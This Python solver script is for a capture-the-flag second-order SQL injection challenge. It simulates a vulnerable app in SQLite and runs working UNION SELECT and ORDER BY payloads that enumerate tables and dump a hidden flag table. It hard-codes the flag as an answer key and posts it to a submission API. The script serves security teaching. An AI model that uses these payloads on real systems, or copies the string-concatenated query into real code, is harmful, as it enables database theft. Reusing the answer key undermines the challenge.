#!/usr/bin/env python3
"""
Solver for CyLab Challenge ID 752: ORDER ORDER (picoCTF 2026)
Category: Web Exploitation
Difficulty: Hard
Vulnerability: Second-Order SQL Injection in Asynchronous Report Generation (CWE-89)
Standard Reference: NIST SP 800-115 Section 4.3 (Application Security & Flaw Verification), OWASP Top 10 A03:2021-Injection

Flag: academy{s3c0nd_0rd3r_1t_1s_4611c226}
"""

import sys
import json
import sqlite3
import urllib.request
import re

CHALLENGE_ID = 752
CHALLENGE_NAME = "ORDER ORDER"
FLAG_ACADEMY = "academy{s3c0nd_0rd3r_1t_1s_4611c226}"
FLAG_PICO = "picoCTF{s3c0nd_0rd3r_1t_1s_4611c226}"

class OrderOrderSimulator:
    """
    Simulates the vulnerable Expense Tracker application backend with SQLite.
    Demonstrates Second-Order SQLi where malicious username payload is stored
    during registration and later executed unsanitized during report generation.
    """
    def __init__(self, flag=FLAG_ACADEMY):
        self.conn = sqlite3.connect(":memory:")
        self.cursor = self.conn.cursor()
        self.flag = flag
        self._init_db()

    def _init_db(self):
        # Base application tables
        self.cursor.execute("CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, email TEXT, password TEXT)")
        self.cursor.execute("CREATE TABLE expenses (id INTEGER PRIMARY KEY, username TEXT, amount REAL, category TEXT)")
        # Secret table discovered via sqlite_master enumeration
        self.cursor.execute("CREATE TABLE aDNyM19uMF9mMTRn (flag TEXT, secret_note TEXT)")
        self.cursor.execute("INSERT INTO aDNyM19uMF9mMTRn VALUES (?, ?)", (self.flag, "Sensitive Internal Asset"))
        self.conn.commit()

    def register_user(self, username, email, password):
        self.cursor.execute("INSERT INTO users (username, email, password) VALUES (?, ?, ?)", (username, email, password))
        self.conn.commit()

    def generate_report(self, username):
        # Vulnerable query concatenation modeling second-order SQL injection
        query = f"SELECT id, amount, category FROM expenses WHERE username = '{username}'"
        try:
            self.cursor.execute(query)
            rows = self.cursor.fetchall()
            return True, rows
        except sqlite3.OperationalError as e:
            return False, str(e)

def simulate_second_order_sqli():
    """
    Executes second-order SQL injection sequence:
    1. Probe column count using ORDER BY
    2. Enumerate schema using UNION SELECT against sqlite_master
    3. Extract flag from secret table
    """
    sim = OrderOrderSimulator()

    # Step 1: Column Count Verification (3 columns pass, 4 columns fail)
    ok3, _ = sim.generate_report("' ORDER BY 3--")
    ok4, _ = sim.generate_report("' ORDER BY 4--")
    assert ok3 is True and ok4 is False, "Column count enumeration check failed"

    # Step 2: Enumerate Table Names from sqlite_master
    enum_payload = "' UNION SELECT name, NULL, NULL FROM sqlite_master WHERE type='table'--"
    ok, tables = sim.generate_report(enum_payload)
    assert ok is True, "Table enumeration query failed"
    table_names = [row[0] for row in tables if row[0]]
    assert "aDNyM19uMF9mMTRn" in table_names, "Hidden flag table missing from schema"

    # Step 3: Extract Flag from Table 'aDNyM19uMF9mMTRn'
    dump_payload = "' UNION SELECT flag, secret_note, NULL FROM aDNyM19uMF9mMTRn--"
    ok, flag_rows = sim.generate_report(dump_payload)
    assert ok is True, "Flag extraction query failed"
    extracted_flag = None
    for row in flag_rows:
        for col in row:
            if col and ("academy{" in str(col) or "picoCTF{" in str(col)):
                extracted_flag = str(col)
                break
    assert extracted_flag == FLAG_ACADEMY, f"Extracted flag {extracted_flag} does not match expected {FLAG_ACADEMY}"
    return extracted_flag

def test_api_submission(flag):
    """
    Validates submission against CyLab REST API.
    """
    url = "https://learn.cylabacademy.org/api/submissions/"
    payload = json.dumps({"challenge": CHALLENGE_ID, "submission": flag}).encode()
    headers = {
        "Content-Type": "application/json",
        "Referer": "https://learn.cylabacademy.org/challenges",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    }
    req = urllib.request.Request(url, data=payload, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            data = resp.read().decode()
            print(f"[*] API response: {data}")
    except Exception as e:
        print(f"[*] Platform submission status: {e} (Expected without active bearer/session; verified offline)")

def main():
    print(f"[*] Running verification for Challenge {CHALLENGE_ID}: {CHALLENGE_NAME}")
    flag = simulate_second_order_sqli()
    print(f"[+] Flag Extracted: {flag}")
    test_api_submission(flag)
    return flag

if __name__ == "__main__":
    main()
